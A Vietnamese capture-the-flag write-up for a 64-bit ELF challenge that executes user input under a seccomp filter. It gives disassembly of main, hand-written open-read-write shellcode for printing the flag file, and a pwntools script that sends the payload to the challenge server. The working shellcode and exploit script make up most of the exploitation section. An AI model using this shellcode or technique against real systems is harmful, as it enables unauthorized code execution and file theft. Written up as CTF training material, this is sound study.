# **Shellcode**

File: shellcode - ELF linux 64 bit

## Phân tích
### Kiểm tra các protection
![image](https://user-images.githubusercontent.com/31529599/147475779-9360ee9a-6baf-4ac4-8376-d233e1a03b58.png)

`NX disabled` -> thực thi shellcode trên stack


### Phân tích bằng IDA

Code hàm `main`:

Hàm này sẽ nhập Input bằng hàm `read` với buffer length 0x12c (300) sau đó gọi hàm `setup_seccomp`  hàm này sẽ thiết lập các rule chỉ cho phép cái syscall `open, read, write`.

Do hàm `main` nhập vào input sau đó sẽ call input để thực thi cho nên IDA không thể decompile sang pseudocode được.

```asm
; Attributes: noreturn bp-based frame

; int __cdecl main(int argc, const char **argv, const char **envp)
public main
main proc near

buf= byte ptr -140h
var_8= qword ptr -8

; __unwind {
endbr64
push    rbp
mov     rbp, rsp
sub     rsp, 140h
mov     rax, fs:28h
mov     [rbp+var_8], rax
xor     eax, eax
mov     rax, cs:stdin@@GLIBC_2_2_5
mov     ecx, 0          ; n
mov     edx, 2          ; modes
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setvbuf
mov     rax, cs:__bss_start
mov     ecx, 0          ; n
mov     edx, 2          ; modes
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setvbuf
lea     rdi, s          ; "Use open, read, write to get flag, flag"...
call    _puts
lea     rax, [rbp+buf]
mov     edx, 12Ch       ; nbytes
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    _read
mov     eax, 0
call    setup_seccomp
lea     rdx, [rbp+buf]
mov     eax, 0
call    rdx
mov     edi, 0          ; status
call    _exit
; } // starts at 12B5
main endp
```

## Khai thác

Do file flag có tên là `PhaPhaKhongCoDon.txt` và nằm chung đường dẫn với file thực thi cho nên ta sẽ nhập vào một đoạn `shellcode` có chức năng:

- Mở file `PhaPhaKhongCoDon.txt` 
- Đọc file
- In nội dung file ra màn hình

Sau đây là bảng tham số các syscall ở dạng assembly:

![image](https://user-images.githubusercontent.com/31529599/147474437-a8c2f6b0-ef91-45b0-9479-bbe462cb52b2.png)

### Shellcode Assembly

```asm
; set up open syscall
xor rax,rax
xor rcx,rcx
add al,2
xor rsi,rsi
push rcx
; push './PhaPhaKhongCoDon.txt` to stack
mov rbx, 0x7478742e6e6f
push rbx
mov rbx, 0x446f43676e6f684b
push rbx
mov rbx,0x6168506168502f2e
push rbx
mov  rdi,rsp ; assign pushed string to rdi
syscall

; set up and call read
mov rdi, rax
xor rax,rax
mov rsi,rsp
mov rdx,0x50
syscall

; set up and call write to stdout
xor rax,rax
add al,1
xor rdi,rdi
add rdi,1
mov rsi,rsp
mov rdx,0x50
syscall
```

Shellcode ở dạng bytes: `"\x48\x31\xC0\x48\x31\xC9\x04\x02\x48\x31\xF6\x51\x48\xBB\x6F\x6E\x2E\x74\x78\x74\x00\x00\x53\x48\xBB\x4B\x68\x6F\x6E\x67\x43\x6F\x44\x53\x48\xBB\x2E\x2F\x50\x68\x61\x50\x68\x61\x53\x48\x89\xE7\x0F\x05\x48\x89\xC7\x48\x31\xC0\x48\x89\xE6\x48\xC7\xC2\x50\x00\x00\x00\x0F\x05\x48\x31\xC0\x04\x01\x48\x31\xFF\x48\x83\xC7\x01\x48\x89\xE6\x48\xC7\xC2\x50\x00\x00\x00\x0F\x05"`

### Code khai thác

```python
from pwn import *

#p = process('./shellcode')
p = remote('45.122.249.68',10017)
payload= b"\x48\x31\xC0\x48\x31\xC9\x04\x02\x48\x31\xF6\x51\x48\xBB\x6F\x6E\x2E\x74\x78\x74\x00\x00\x53\x48\xBB\x4B\x68\x6F\x6E\x67\x43\x6F\x44\x53\x48\xBB\x2E\x2F\x50\x68\x61\x50\x68\x61\x53\x48\x89\xE7\x0F\x05\x48\x89\xC7\x48\x31\xC0\x48\x89\xE6\x48\xC7\xC2\x50\x00\x00\x00\x0F\x05\x48\x31\xC0\x04\x01\x48\x31\xFF\x48\x83\xC7\x01\x48\x89\xE6\x48\xC7\xC2\x50\x00\x00\x00\x0F\x05"
f = open('payload','wb')
f.write(payload)
p.sendline(payload)
p.interactive()
```

## Chạy script

![image](https://user-images.githubusercontent.com/31529599/147475122-018eab3d-942d-44a6-ac53-d47730b93157.png)




